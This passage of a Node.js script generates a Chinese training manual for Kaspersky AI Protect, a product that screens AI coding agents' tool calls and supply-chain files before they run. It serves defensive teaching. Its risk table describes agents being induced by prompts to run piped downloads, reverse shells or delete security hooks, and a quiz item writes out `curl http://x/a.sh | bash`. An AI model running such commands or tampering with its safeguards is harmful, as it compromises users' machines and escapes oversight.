// 生成《Kaspersky AI Protect（KAIP）产品培训手册》Word 文档（卡巴斯基设计风格）
// 用法：python build_training_diagrams.py && node build_training_manual.js  → KAIP_产品培训手册.docx
const fs = require("fs");
const path = require("path");
const {
  Document, Packer, Paragraph, TextRun, HeadingLevel, Table, TableRow, TableCell, WidthType, ShadingType,
  AlignmentType, LevelFormat, BorderStyle, Header, Footer, PageNumber, TableOfContents, ImageRun,
  HorizontalPositionRelativeFrom, VerticalPositionRelativeFrom, TextWrappingType, VerticalAlign,
  TabStopType, TableLayoutType,
} = require("docx");

// ---------- 设计规范 ----------
const GREEN = "00A88E", GREEN_D = "006D5C", GREEN_L = "E6F6F3", INK = "1D1D1B", GRAPH = "3C3C3B",
  GRAY = "8A8A8A", PANEL = "F4F6F5", LINE = "DCE3E0", AMBER = "B7791F", AMBER_L = "FDF4E3", RED = "C0392B", RED_L = "FBECEA";
const CJK = "Microsoft YaHei";
const BRANDF = { ascii: "Kaspersky Sans Display", hAnsi: "Kaspersky Sans Display", eastAsia: CJK, cs: "Kaspersky Sans Display" };
const BODYF = { ascii: CJK, hAnsi: CJK, eastAsia: CJK, cs: CJK };
const MONO = { ascii: "Consolas", hAnsi: "Consolas", eastAsia: CJK, cs: "Consolas" };
const W = 9638;                       // 正文宽度（A4，左右 2 cm）
const IMG = path.join(__dirname, "training-img");
const img = (n) => fs.readFileSync(path.join(IMG, n));
const VERSION = "V1.0", DATE = "2026 年 11 月 20 日";

// ---------- 文字 ----------
const runs = (text, o = {}) => {
  const out = [];
  String(text).split(/(\*\*[^*]+\*\*|`[^`]+`)/).forEach((seg) => {
    if (!seg) return;
    if (seg.startsWith("`") && seg.endsWith("`") && seg.length > 1) {
      out.push(new TextRun({ text: seg.slice(1, -1), font: MONO, size: Math.max((o.size || 20) - 2, 15), color: GREEN_D }));
    } else {
      const b = seg.startsWith("**") && seg.endsWith("**");
      out.push(new TextRun({ text: b ? seg.slice(2, -2) : seg, bold: b || o.bold, font: o.font || BODYF, size: o.size || 20,
        color: b && !o.color ? INK : (o.color || GRAPH) }));
    }
  });
  return out;
};
const P = (t, o = {}) => new Paragraph({ children: runs(t, o), spacing: { before: 40, after: 110, line: 336 }, alignment: o.align });
const gap = (n = 80) => new Paragraph({ children: [], spacing: { before: 0, after: n } });
const H2 = (t) => new Paragraph({ heading: HeadingLevel.HEADING_2, children: [new TextRun({ text: t })] });
const H3 = (t) => new Paragraph({ heading: HeadingLevel.HEADING_3, children: [new TextRun({ text: t })] });
const bullets = (items, level = 0) => items.map((t) => new Paragraph({ numbering: { reference: "bul", level }, children: runs(t), spacing: { before: 20, after: 60, line: 320 } }));
let seqN = 0;
const numberedRef = (ref) => (items) => items.map((t) => new Paragraph({ numbering: { reference: ref, level: 0 }, children: runs(t), spacing: { before: 20, after: 70, line: 320 } }));
const numbered = (items) => numberedRef(`num${++seqN}`)(items);
const seqList = () => numberedRef(`num${++seqN}`);   // 被代码块隔开、需连续编号的步骤
const sKse = seqList();
// 关于本手册中的小标题（不进入目录）
const SubT = (t) => new Paragraph({ children: [new TextRun({ text: t, font: BRANDF, size: 26, bold: true, color: INK })], spacing: { before: 280, after: 120 }, keepNext: true,
  border: { left: { style: BorderStyle.SINGLE, size: 24, color: GREEN, space: 8 } }, indent: { left: 160 } });
const code = (lines) => (Array.isArray(lines) ? lines : [lines]).map((l, i, a) => new Paragraph({
  children: [new TextRun({ text: l || " ", font: MONO, size: 17, color: l.trim().startsWith("#") ? GRAY : INK })],
  shading: { type: ShadingType.CLEAR, color: "auto", fill: PANEL },
  border: { left: { style: BorderStyle.SINGLE, size: 18, color: GREEN, space: 10 } },
  spacing: { before: i === 0 ? 100 : 0, after: i === a.length - 1 ? 160 : 0, line: 264 },
  indent: { left: 220, right: 120 },
}));

// ---------- 提示框 ----------
const NOTE = { tip: ["提示", GREEN, GREEN_L], warn: ["注意", AMBER, AMBER_L], risk: ["重要", RED, RED_L], teach: ["讲师提示", GREEN_D, PANEL] };
const note = (text, kind = "tip") => {
  const [label, c, fill] = NOTE[kind];
  return new Paragraph({
    children: [new TextRun({ text: label + "  ", bold: true, font: BRANDF, size: 19, color: c }), ...runs(text, { size: 19 })],
    shading: { type: ShadingType.CLEAR, color: "auto", fill },
    border: { left: { style: BorderStyle.SINGLE, size: 24, color: c, space: 10 } },
    spacing: { before: 120, after: 160, line: 312 }, indent: { left: 220, right: 120 },
  });
};

// ---------- 表格 ----------
const NB = { style: BorderStyle.NONE, size: 0, color: "FFFFFF" };
const HB = { style: BorderStyle.SINGLE, size: 4, color: LINE };
const table = (headers, rows, widths) => {
  const total = widths.reduce((a, b) => a + b, 0);
  const ws = widths.map((w) => Math.round((w / total) * W));
  ws[ws.length - 1] += W - ws.reduce((a, b) => a + b, 0);
  const mk = (text, i, head, zebra) => new TableCell({
    width: { size: ws[i], type: WidthType.DXA },
    shading: { type: ShadingType.CLEAR, color: "auto", fill: head ? INK : (zebra ? PANEL : "FFFFFF") },
    margins: { top: 70, bottom: 70, left: 110, right: 110 },
    verticalAlign: VerticalAlign.CENTER,
    borders: { top: head ? NB : HB, bottom: head ? { style: BorderStyle.SINGLE, size: 12, color: GREEN } : HB, left: NB, right: NB },
    children: String(text).split("\n").map((line) => new Paragraph({ children: runs(line, { size: 18, bold: head, color: head ? "FFFFFF" : undefined }), spacing: { before: 0, after: 20, line: 276 } })),
  });
  return [new Table({
    width: { size: W, type: WidthType.DXA }, columnWidths: ws, layout: TableLayoutType.FIXED,
    rows: [new TableRow({ tableHeader: true, cantSplit: true, children: headers.map((h, i) => mk(h, i, true)) }),
      ...rows.map((r, ri) => new TableRow({ cantSplit: true, children: r.map((c, i) => mk(c, i, false, ri % 2 === 1)) }))],
  }), gap(120)];
};

// 卡片：学习目标 / 本章要点
const card = (title, items, { fill = GREEN_L, bar = GREEN, numberedItems = false } = {}) => {
  const ref = numberedItems ? `num${++seqN}` : "bul";
  return [new Table({
    width: { size: W, type: WidthType.DXA }, columnWidths: [W], layout: TableLayoutType.FIXED,
    rows: [new TableRow({ cantSplit: true, children: [new TableCell({
      width: { size: W, type: WidthType.DXA }, shading: { type: ShadingType.CLEAR, color: "auto", fill },
      margins: { top: 160, bottom: 140, left: 260, right: 220 },
      borders: { top: NB, bottom: NB, right: NB, left: { style: BorderStyle.SINGLE, size: 36, color: bar } },
      children: [
        new Paragraph({ children: [new TextRun({ text: title, bold: true, font: BRANDF, size: 22, color: bar === GREEN ? GREEN_D : bar })], spacing: { after: 80 } }),
        ...items.map((t) => new Paragraph({ numbering: { reference: ref, level: 0 }, children: runs(t, { size: 19 }), spacing: { before: 10, after: 50, line: 300 } })),
      ],
    })] })],
  }), gap(160)];
};
const objectives = (items) => card("学习目标", items);
const summary = (items) => card("本章要点", items, { fill: PANEL, bar: INK });
const quiz = (items) => card("自测题（答案见附录 B）", items, { fill: "FFFFFF", bar: GREEN, numberedItems: true });

// 插图
const figure = (file, wpx, hpx, caption) => [
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { before: 120, after: 60 },
    children: [new ImageRun({ type: "png", data: img(file), transformation: { width: wpx, height: hpx },
      altText: { title: caption, description: caption, name: file } })] }),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 200 }, children: runs(caption, { size: 17, color: GRAY }) }),
];
let figN = 0;
const fig = (file, srcW, srcH, title) => figure(file, 642, Math.round(642 * srcH / srcW), `图 ${++figN}  ${title}`);

// 模块扉页式标题
const moduleHead = (no, title, lead) => [
  new Paragraph({ pageBreakBefore: true, spacing: { before: 0, after: 0 },
    children: [new TextRun({ text: `MODULE ${String(no).padStart(2, "0")}`, font: BRANDF, size: 18, bold: true, color: GREEN, characterSpacing: 40 })] }),
  new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun({ text: `${no}  ${title}` })] }),
  new Paragraph({ children: runs(lead, { size: 21, color: GRAPH }), spacing: { before: 0, after: 240, line: 340 },
    border: { bottom: { style: BorderStyle.SINGLE, size: 6, color: LINE, space: 12 } } }),
];

// ---------- 正文 ----------
const body = [];
const add = (...xs) => xs.flat(Infinity).forEach((x) => body.push(x));

// ===== 关于本手册 =====
add(
  new Paragraph({ children: [new TextRun({ text: "ABOUT", font: BRANDF, size: 18, bold: true, color: GREEN, characterSpacing: 40 })] }),
  new Paragraph({ children: [new TextRun({ text: "关于本手册", font: BRANDF, size: 40, bold: true, color: INK })], spacing: { after: 240 } }),
  P("本手册是 Kaspersky AI Protect（以下简称 **KAIP**）的产品培训教材，覆盖产品原理、架构、安装、配置、日常维护、卸载与故障排查，并配有课堂实验。每个模块以「学习目标」开头，以「本章要点」与「自测题」结束，可用于讲师授课，也可用于自学。"),
  ...table(["项目", "说明"], [
    ["培训对象", "卡巴斯基售前与实施工程师、合作伙伴工程师、客户侧安全与运维人员"],
    ["前置知识", "Linux 基本操作（systemd、journalctl、文件权限）；Docker 基础；了解至少一种 AI 编程助手（Codex / WorkBuddy / OpenCode）的使用"],
    ["适用版本", "KAIP 1.0.0（离线包 20261120 及之后）；Kaspersky Scan Engine 2.2"],
    ["配套文档", "《KAIP PoC 实施手册》（现场实施步骤与测试用例）；KSE 2.2 官方文档"],
  ], [18, 82]),
  SubT("课程地图"),
  ...table(["模块", "内容", "建议课时"], [
    ["1  产品概述", "AI Agent 带来的新风险、产品定位、核心能力与边界", "0.5 小时"],
    ["2  架构与原理", "组件、拦截流程、判定逻辑、防篡改、部署模式、端口与目录", "1 小时"],
    ["3  安装部署", "KSE、平台（离线包 / Docker）、分机部署、终端与容器接入、下载代理", "1.5 小时"],
    ["4  配置管理", "控制台、防护策略、平台参数、KSE 配置、SIEM、凭据、业务集成", "1 小时"],
    ["5  运维与维护", "巡检、健康检查、病毒库与缓存、升级、备份恢复、日志、终端与隔离区", "1 小时"],
    ["6  卸载与清理", "终端、容器、下载代理、服务器", "0.5 小时"],
    ["7  故障排查", "排查思路与常见问题", "1 小时"],
    ["8  实验练习", "7 个课堂实验", "2 小时"],
  ], [24, 58, 18]),
  note("阅读约定：`等宽字体` 为命令、路径与配置项；<平台>、<KSE IP> 等为需替换的占位符；「」中为控制台页面或按钮名称。提示框给出建议，注意框说明易错点，重要框说明可能导致防护失效或数据丢失的情况，讲师提示供授课展开。", "tip"),
);

// ===== 目录 =====
add(
  new Paragraph({ pageBreakBefore: true, children: [new TextRun({ text: "CONTENTS", font: BRANDF, size: 18, bold: true, color: GREEN, characterSpacing: 40 })] }),
  new Paragraph({ children: [new TextRun({ text: "目录", font: BRANDF, size: 40, bold: true, color: INK })], spacing: { after: 240 } }),
  new TableOfContents("目录", { hyperlink: true, headingStyleRange: "1-2" }),
);

// ===== 1 产品概述 =====
add(
  moduleHead(1, "产品概述", "AI 编程助手正在获得与开发者相同的权限。本模块说明它带来了哪些新的攻击面，以及 KAIP 如何在 Agent 动手之前把关。"),
  objectives([
    "说出 AI Agent 与 AI 供应链面临的主要风险；",
    "用一句话说明 KAIP 的定位，列出它的三类核心能力；",
    "说明 KAIP 支持的 AI Agent、操作系统与引擎版本；",
    "向客户如实说明 KAIP 的能力边界。",
  ]),
  H2("1.1 背景：AI Agent 带来的新风险"),
  P("Codex、WorkBuddy、OpenCode 等 AI 编程助手（以下统称 **AI Agent**）可以直接执行 shell 命令、读写文件、运行代码、访问网络、安装并调用 Skill。它们以开发者本人的账号运行，开发者往往一键批准，甚至开启完全自主模式。"),
  ...table(["风险", "典型场景"], [
    ["恶意命令执行", "提示词或网页内容诱导 Agent 执行 `curl … | bash`、反弹 shell、下载并运行未知程序"],
    ["恶意文件落盘", "Agent 通过写文件工具、一行 Python、heredoc 或内置代码运行器写入病毒文件"],
    ["供应链投毒", "从技能市场、模型仓库、npm / PyPI 引入带后门的 Skill、含恶意 pickle 的模型、被篡改的数据集与 RAG 文档"],
    ["访问恶意网址", "Agent 按提示访问钓鱼或恶意 URL，下载载荷"],
    ["破坏安全组件", "Agent 被诱导删除安全 hook、停止监控进程、读取安全组件凭据"],
  ], [22, 78]),
  P("传统终端杀毒在文件落盘或进程启动后才介入，看不到「Agent 正准备做什么」，也不了解 Skill、模型、RAG 这些 AI 场景特有的入口。"),
  H2("1.2 产品定位"),
  note("KAIP 是基于 Kaspersky Scan Engine（KSE）的 AI 场景安全平台：在 AI Agent 执行每一次工具调用之前，以及模型、Skill、文档进入企业之前，用卡巴斯基引擎与 AI 场景规则做判定，恶意即阻断。", "tip"),
  H2("1.3 核心能力"),
  ...table(["能力", "说明", "关键组件"], [
    ["AI Agent 运行时防护", "执行命令、写/改文件、运行代码、访问 URL、调用 Skill 前拦截；文件经 KSE 扫描，命令经 KAIP 规则分析，URL 经 KSE 信誉检查", "终端 hook / 插件、KAIP 平台、KSE"],
    ["AI 供应链入口扫描", "模型文件、Skill 包、RAG 文档、训练数据集上传或代下载时扫描，通过后才放行入库；下载代理在 HTTPS 解密后经 ICAP 扫描下载内容", "供应链扫描网关、Squid + KSE ICAP"],
    ["自我保护与可运营", "阻止 Agent 篡改 KAIP，被改动后自动修复；Agent 升级后自动复核防护；事件集中展示并转发 SIEM", "kaip-watch、平台事件与 SIEM 转发"],
  ], [20, 56, 24]),
  H2("1.4 支持范围"),
  ...table(["类别", "支持情况"], [
    ["AI Agent", "Codex（桌面版 / CLI，hooks 机制）；WorkBuddy / CodeBuddy（settings.json hooks）；OpenCode 1.x / 2.x（插件，按版本自动选择写法），含容器化 OpenCode"],
    ["终端系统", "Windows 10 / 11；主流 Linux 发行版；Docker 容器（glibc 基础镜像）。不支持 Windows 7"],
    ["终端依赖", "Node.js 18+；没有时一键安装会从平台下载私有 Node.js 运行时，不影响系统环境"],
    ["服务器系统", "x86_64：Ubuntu 20.04 / 22.04 / 24.04、Debian 11 / 12、CentOS 7+ / RHEL 8+。系统 Python 低于 3.10 时离线包自动使用自带的便携 Python 3.12"],
    ["扫描引擎", "Kaspersky Scan Engine 2.2（HTTP 模式供平台调用，ICAP 模式供下载代理调用），需有效许可证"],
  ], [18, 82]),
  H2("1.5 能力边界"),
  P("以下边界须在售前交流与 PoC 启动会上向客户如实说明："),
  ...bullets([
    "**只拦截经过 Agent 工具调用的操作。**用户绕开 Agent 手工执行的操作，由目录监控（事后）与终端杀毒覆盖。",
    "**KAIP 规则是静态特征，用于补强 AI 场景。**恶意代码的最终判定以 KSE 为准；刻意编码、分段写入的载荷可能绕过执行前检查，需落盘扫描与终端杀毒补位。",
    "**防篡改运行在用户态，与 Agent 同一账号。**可以阻断经 Agent 的篡改并事后修复，无法抵御同账号的人工操作或 root 权限的恶意进程。",
    "**提示词注入等语义层攻击**不属于文件与代码扫描的范围。",
    "**Agent 升级可能改变接口。**KAIP 会自测、提醒复核、发现静默失效，但新工具需人工评估后补充规则。",
  ]),
  note("讲解边界时，用「执行前拦截 + 事后监控 + 终端杀毒」三层互补来说明，避免客户把 KAIP 理解为 EDR 的替代品。", "teach"),
  summary([
    "AI Agent 拥有 shell 权限，风险集中在命令执行、文件落盘、供应链投毒、恶意网址与破坏安全组件。",
    "KAIP = KSE 引擎 + AI 场景规则 + Agent 执行前拦截 + 供应链入口扫描 + 自我保护。",
    "支持 Codex、WorkBuddy、OpenCode，终端无 Node.js 也可安装。",
  ]),
  quiz([
    "为什么传统终端杀毒不足以防护 AI Agent 的风险？",
    "KAIP 的三类核心能力分别是什么？",
    "用户在命令行手工执行恶意脚本，KAIP 能否在执行前拦截？由什么来覆盖？",
  ]),
);

// ===== 2 架构 =====
add(
  moduleHead(2, "架构与原理", "理解组件之间如何协作，是安装、配置和排障的基础。本模块从一次被拦截的工具调用出发，讲清楚判定是怎么做出的。"),
  objectives([
    "画出 KAIP 的总体架构，说明各组件的职责；",
    "描述一次工具调用从截获到放行 / 阻断的完整流程；",
    "解释五种判定结果及其默认处置；",
    "说明防篡改与自愈的工作方式；",
    "根据客户环境选择部署模式，列出所需端口。",
  ]),
  H2("2.1 组件"),
  ...table(["组件", "部署位置", "职责"], [
    ["Kaspersky Scan Engine（KSE）2.2", "Linux 服务器", "恶意代码检测：病毒库、启发式、KSN 云信誉、URL 信誉、LLM 模型文件扫描。HTTP 模式（1234）供平台调用；ICAP 模式（1344）供下载代理调用"],
    ["KAIP 平台", "与 KSE 同机或分机；原生服务或 Docker 容器", "Agent 判定 API、供应链扫描网关、判定缓存、KAIP 规则、防护策略、隔离区、事件与告警、SIEM 转发、管理控制台、客户端分发"],
    ["KAIP hook / 插件", "开发终端，写入各 Agent 的配置", "在工具调用前截获命令、文件内容、URL，送平台判定并执行结果；本地防篡改规则"],
    ["kaip-watch", "开发终端后台进程（Windows 计划任务 / Linux systemd 用户服务 / 容器入口脚本）", "监控 Skill、插件、模型目录；每 60 秒心跳与完整性校验；被篡改后自动修复；客户端自动升级"],
    ["kaip 命令行", "开发终端", "注册、安装 / 卸载、状态与生效检查、自测、手动扫描、同步"],
    ["Squid 下载代理（可选）", "推荐与 KSE 同机", "解密 HTTPS 后经 ICAP 把下载内容交给 KSE 扫描，检出即返回拦截页"],
  ], [24, 26, 50]),
  H2("2.2 总体架构"),
  ...fig("arch.png", 1000, 600, "KAIP 总体架构"),
  P("终端上的 AI Agent 每次调用工具前，由 KAIP hook / 插件把待执行内容送到平台；平台调用 KSE 与 KAIP 规则判定，返回放行或阻断。业务系统、CI 与知识库用 API Key 调用供应链扫描网关；终端的下载流量可选经 Squid 代理，由 KSE ICAP 扫描，拦截事件经 Syslog 汇入平台。"),
  note("终端只与 KAIP 平台通信，不直连 KSE。KSE 的 HTTP 接口应只对平台开放。", "warn"),
  H2("2.3 一次拦截的全过程"),
  ...fig("flow.png", 1000, 430, "工具调用的判定流程与默认处置"),
  ...numbered([
    "**截获。**Agent 调用工具时，hook / 插件先用本地防篡改规则检查（如删除 KAIP 配置、读取 KAIP 凭据），命中立即阻断；随后提取要执行的脚本、要写入的文件内容、命令中的 URL。",
    "**送检。**内容经 HTTPS 发给平台。文件不超过「Hook 内联扫描上限」（默认 50 MB）时随请求提交，超过的交给 kaip-watch 异步扫描。",
    "**判定。**平台依次检查：哈希黑 / 白名单 → 判定缓存 → KSE 引擎 → KAIP 规则（`curl | bash`、反弹 shell、持久化、危险 pickle 等）。URL 交给 KSE 做信誉检查。",
    "**决策。**按防护策略把判定结果映射为放行、告警或阻断；DETECT 的文件写入隔离区；每次非干净判定都记录事件并按配置转发 SIEM。",
    "**执行。**Agent 收到阻断结果后放弃本次工具调用，并向用户转述拦截原因（含检出名称）。",
  ]),
  H3("判定缓存"),
  P("同一文件（按 SHA-256）在病毒库版本不变时不重复扫描，直接复用上次的 CLEAN / DETECT 结果。病毒库更新后缓存立即失效；查不到病毒库版本时缓存 24 小时，最长不超过 7 天。控制台首页「扫描引擎状态」显示缓存命中率。"),
  H3("大文件扫描方式"),
  P("小于 25 MB 的文件以内存方式（scanmemory）提交 KSE；25 MB 及以上的文件由平台写入扫描目录 `/opt/kaspersky/scanqueue`，KSE 按路径扫描（scanfile），避免编码膨胀。KSE 与平台分机时，该目录经 NFS 只读共享给 KSE（见 3.4）。"),
  H2("2.4 判定结果与处置"),
  ...table(["判定", "含义", "默认处置", "可调策略"], [
    ["CLEAN", "引擎与规则均未发现问题", "放行", "—"],
    ["DETECT", "KSE 检出恶意代码、恶意或钓鱼 URL；或命中哈希黑名单", "阻断；文件写入隔离区", "防护模式（阻断 / 审计）、检出后隔离"],
    ["RISK", "KSE 判定干净，但 KAIP 规则命中", "高危阻断、中危告警；后台监控发现的只告警；从不自动隔离", "KAIP 补充规则命中：阻断 / 告警 / 关闭"],
    ["NON_SCANNED", "加密、损坏等原因无法扫描", "按未放行处理", "无法扫描（加密 / 损坏）"],
    ["ERROR", "KSE 不可用或扫描出错", "放行（fail_open）；规则命中仍按 RISK 阻断", "平台不可达时：放行 / 阻断"],
  ], [17, 32, 29, 22]),
  P("「受信任来源目录」中的文件仍经 KSE 扫描，但 KAIP 规则命中只告警不阻断，用于厂商官方插件市场等已有审核的来源；KSE 检出不受影响。"),
  note("fail_open 让 KSE 故障时不影响开发，但这段时间病毒文件与恶意 URL 不会被拦截。运维须监控 ERROR 事件与 KSE 状态（见模块 5），要求严格的环境可把「平台不可达时」改为阻断。", "risk"),
  H2("2.5 防篡改与自愈"),
  ...fig("heal.png", 1000, 250, "防篡改与自愈"),
  ...bullets([
    "**执行前阻断：**Agent 删除 hook、关闭 hooks 开关、停止或卸载 KAIP、读取 `~/.kaip` 中的凭据，都会被本地规则阻断，并上报 `KAIP:Tamper.*` 事件；只读查看不受影响。",
    "**事后修复：**kaip-watch 每次心跳把客户端文件指纹、策略指纹、hook 状态报给平台。指纹与平台下发的官方版本不一致时，从平台重新下载客户端、恢复 hook 与策略，并上报修复事件。",
    "**自动升级：**平台发布新客户端后，旧版本指纹被识别为「历史官方版本」，终端自动升级而不是按篡改告警。",
    "**防护复核：**检测到 Agent 版本变化时，状态显示「升级待复核」，直到观察到真实的拦截调用；若最近多次工具调用都没有经过 KAIP，提示防护可能已静默失效。",
  ]),
  note("自愈以平台上的官方客户端为准。只替换终端上的客户端文件（例如手工拷贝新版本）会被当作篡改并恢复为平台版本，升级必须从平台侧进行。", "warn"),
  H2("2.6 部署模式"),
  ...fig("deploy.png", 1000, 400, "三种部署模式"),
  ...table(["模式", "适用场景", "要点"], [
    ["A 同机部署", "PoC、中小规模", "平台调用 `127.0.0.1:1234`，大文件经本机扫描目录；最简单"],
    ["B 分机部署", "KSE 已有独立服务器、或需要隔离", "平台 → KSE HTTP 1234；平台扫描目录经 NFS 只读共享给 KSE；挂载使用 soft 参数"],
    ["C 容器部署", "客户以 Docker 管理服务", "平台容器使用 host 网络、以 UID 10001 运行，数据在 `kaip-data` 卷；KSE 仍原生安装；可与 A / B 组合"],
  ], [16, 30, 54]),
  H2("2.7 端口与网络"),
  ...table(["方向", "端口", "用途"], [
    ["终端 → 平台", "443（Nginx）/ 8080", "判定、心跳、客户端与运行时下载。生产环境必须用 HTTPS"],
    ["业务系统 / CI → 平台", "443 / 8080", "供应链扫描网关（API Key）"],
    ["平台 → KSE", "1234", "HTTP 模式扫描；同机为 127.0.0.1"],
    ["KSE → 平台", "TCP 2049（NFSv4）", "仅分机部署：读取平台扫描目录"],
    ["KSE → 平台", "UDP 5514", "KSE（含 ICAP）日志汇入平台，可选"],
    ["终端 → 下载代理", "3128", "仅启用下载代理时"],
    ["Squid → KSE", "127.0.0.1:1344", "ICAP；防火墙只放行本机"],
    ["KSE → 卡巴斯基", "TCP 80 / 443", "病毒库更新、KSN、激活；HTTPS 解密设备需豁免"],
    ["平台 → SIEM", "UDP / TCP 514", "CEF / JSON 事件转发，可选"],
  ], [26, 24, 50]),
  H2("2.8 目录与文件"),
  ...table(["位置", "内容"], [
    ["`/opt/kaip/`", "平台程序：`server/`、`client/`（官方客户端，自愈与升级的来源）、`runtime/`（终端私有 Node.js）、`python/`（便携 Python，按需）"],
    ["`/etc/kaip/kaip.env`", "平台配置（权限 600）"],
    ["`/var/lib/kaip/`", "数据（权限 700）：`kaip.db` 数据库（事件、终端、策略、缓存）、`quarantine/` 隔离区、`released/` 放行区、`staging/` 临时区"],
    ["`/opt/kaspersky/scanqueue/`", "大文件扫描目录（扫描后立即删除）"],
    ["终端 `~/.kaip/`", "`config.json`（凭据与策略，600）、`client/`、`logs/kaip.log`、`quarantine/`、`node/`（私有运行时）"],
    ["Agent 配置", "Codex `~/.codex/hooks.json` 与 `config.toml`；WorkBuddy `~/.workbuddy/settings.json`；OpenCode `~/.config/opencode/plugins/kaip.js`"],
  ], [28, 72]),
  summary([
    "终端 hook 截获 → 平台判定（名单、缓存、KSE、规则）→ 策略决策 → Agent 执行或放弃。",
    "五种判定：CLEAN、DETECT、RISK、NON_SCANNED、ERROR；ERROR 默认放行但规则命中仍阻断。",
    "kaip-watch 负责心跳、自愈与自动升级；自愈以平台上的官方客户端为准。",
    "部署模式：同机、分机（NFS 只读、soft 挂载）、容器。",
  ]),
  quiz([
    "一个 30 MB 的模型文件在分机部署下是如何被扫描的？",
    "KSE 停止服务期间，Agent 执行 `curl http://x/a.sh | bash` 和写入一个病毒文件，分别会发生什么？",
    "为什么不能只在终端上替换客户端文件来完成升级？",
    "RISK 判定的文件会被自动隔离吗？",
  ]),
);

// ===== 3 安装 =====
add(
  moduleHead(3, "安装部署", "按「先服务端、后终端」的顺序完成部署。客户内网通常无法访问互联网，优先使用离线安装包。"),
  objectives([
    "完成安装前的环境与信息检查；",
    "安装并配置 KSE，使其满足 KAIP 的要求；",
    "分别用离线包与 Docker compose 安装 KAIP 平台；",
    "为 Windows、Linux 终端和容器中的 OpenCode 接入 KAIP；",
    "完成安装验收。",
  ]),
  H2("3.1 安装规划"),
  ...table(["检查项", "要求 / 需确认的内容"], [
    ["服务器", "x86_64 Linux；8 核 CPU、16 GB 内存起步、100 GB 磁盘（扫描 1 GB 文件约需 2 GB 内存）"],
    ["KSE", "2.2 安装包与有效许可证（含 KSN 授权）；与平台同机还是分机"],
    ["网络", "终端能访问平台 8080 / 443；KSE 能否访问卡巴斯基更新源与 KSN；分机时两台服务器之间开放 1234 与 NFS"],
    ["终端", "操作系统版本；使用的 Agent 及版本；是否允许计划任务 / systemd 用户服务"],
    ["容器", "Docker 20.10+ 与 Compose v2；OpenCode 容器由谁管理、用什么镜像"],
    ["共存", "服务器上的 KESL 需为扫描目录与数据目录添加排除（在 KSC 策略中配置）"],
  ], [18, 82]),
  ...table(["离线包目录", "内容"], [
    ["`install-offline.sh`", "平台离线安装 / 升级脚本"],
    ["`server/`、`client/`", "平台与终端客户端程序"],
    ["`wheels/`、`python/`", "Python 依赖（3.10–3.12）与便携 Python 3.12"],
    ["`runtime/`", "终端私有 Node.js 运行时（Windows / Linux）"],
    ["`images/`", "平台 Docker 镜像"],
    ["`deploy/`", "compose 文件、分机共享脚本、Squid 代理脚本、Nginx 配置、容器接入片段"],
    ["`docs/`、`tests/`", "PoC 实施手册、集成测试脚本"],
  ], [26, 74]),
  H2("3.2 安装与配置 KSE"),
  ...sKse([
    "按 KSE 官方文档以 HTTP + ICAP（Multi）模式安装并激活许可证，确认 `kavhttpd`、`kavicapd`、`klScanEngineUI` 均为 active。",
    "立即手动更新一次病毒库，并确认病毒库日期为近期：",
  ]),
  ...code(["curl -s -X POST http://127.0.0.1:1234/api/v3.0/update/start", "curl -s http://127.0.0.1:1234/api/v3.0/basesdate"]),
  ...sKse([
    "KSE 控制台 **Settings → Service**：同机部署时监听 `127.0.0.1:1234`，并在「Locations where remote scanning is allowed」添加 `/opt/kaspersky/scanqueue`；分机部署见 3.4。",
    "**Settings → Scanning**：开启 **Enable Phishing Protection** 与 **Enable reputation checking**，否则钓鱼 URL 检不出。",
    "启用 LLM 模型文件深度扫描：在 `/opt/kaspersky/ScanEngine/ppl/kave.ini` 的 `[Environment]` 段加入 `KL_SCAN_LLM=1`，重启 `kavhttpd` 与 `kavicapd`。",
  ]),
  note("KSE 默认通过本地 socket 监听，不改为 TCP 地址时平台会报「无法连接 KSE: Connection refused」。", "warn"),
  H2("3.3 安装 KAIP 平台"),
  H3("方式一：离线安装包（推荐）"),
  ...code([
    "tar -xzf kaip-offline-1.0.0-<日期>.tar.gz && cd kaip-offline-1.0.0-<日期>",
    "sudo bash install-offline.sh                     # KSE 与平台同机",
    "curl -s http://127.0.0.1:8080/healthz            # {\"status\":\"ok\",\"engine\":\"kse\"}",
  ]),
  ...bullets([
    "脚本自动校验离线包完整性；系统 Python 为 3.10–3.12 时直接使用，更低版本自动使用包内便携 Python。",
    "安装为 systemd 服务 `kaip-platform`，以服务账号 `kaip` 运行；配置写入 `/etc/kaip/kaip.env`。",
    "可选参数：`--port`（默认 8080）、`--kse-url` / `--kse-share`（分机部署）、`--mock`（未装 KSE 时以模拟引擎演示）。",
    "重复执行即为升级或修复，保留配置与数据。",
  ]),
  H3("方式二：Docker compose"),
  ...code([
    "docker load -i images/kaip-platform-image-1.0.0.tar.gz",
    "cd deploy && cp compose.env.example .env && vi .env        # KAIP_KSE_URL、端口等",
    "sudo install -d -o 10001 -g 10001 -m 0775 /opt/kaspersky/scanqueue",
    "docker compose up -d && docker compose ps                 # STATUS 为 healthy",
  ]),
  P("容器以非 root 用户（UID 10001）运行、使用 host 网络；数据在 `kaip-data` 卷中，重建容器与升级镜像后保留。"),
  H3("首次登录"),
  P("浏览器打开 `http://<平台>:8080`，用户名 `admin`。初始密码在 `/var/lib/kaip/initial_admin_password.txt`（Docker 方式：`docker compose exec kaip cat /var/lib/kaip/initial_admin_password.txt`）。**首次登录后立即修改密码**，修改后该文件自动删除。"),
  H2("3.4 KSE 分机部署"),
  ...numbered([
    "平台服务器共享扫描目录（只读、只允许 KSE 主机）：`sudo bash deploy/kse-share.sh kaip-host <KSE IP>`",
    "KSE 服务器挂载（默认 `/mnt/kaip-scanqueue`，写入 fstab）：`sudo bash kse-share.sh kse-host <平台 IP>`",
    "KSE 控制台：监听平台可访问的地址（防火墙只放行平台 IP），允许扫描的目录添加 `/mnt/kaip-scanqueue`。",
    "平台：安装时加 `--kse-url http://<KSE IP>:1234 --kse-share /mnt/kaip-scanqueue`；已安装的在 `kaip.env` 中设置 `KAIP_KSE_URL` 与 `KAIP_KSE_SCAN_DIR_REMOTE` 后重启服务。",
  ]),
  note("挂载参数必须是 `soft,timeo=50,retrans=2`（脚本默认）。若改为 hard，平台服务器离线时 KSE 的 kavhttpd 会卡死在挂载点上、不再监听 1234，所有扫描失败。", "risk"),
  H2("3.5 启用 HTTPS"),
  P("终端与平台之间传输代码与文件内容，生产环境必须使用 HTTPS：用 `deploy/nginx-kaip.conf` 在 443 端口反向代理到 8080，证书放在 `/etc/kaip/tls/`；终端安装命令中的平台地址改为 `https://`，并加 `--secure` 校验证书。"),
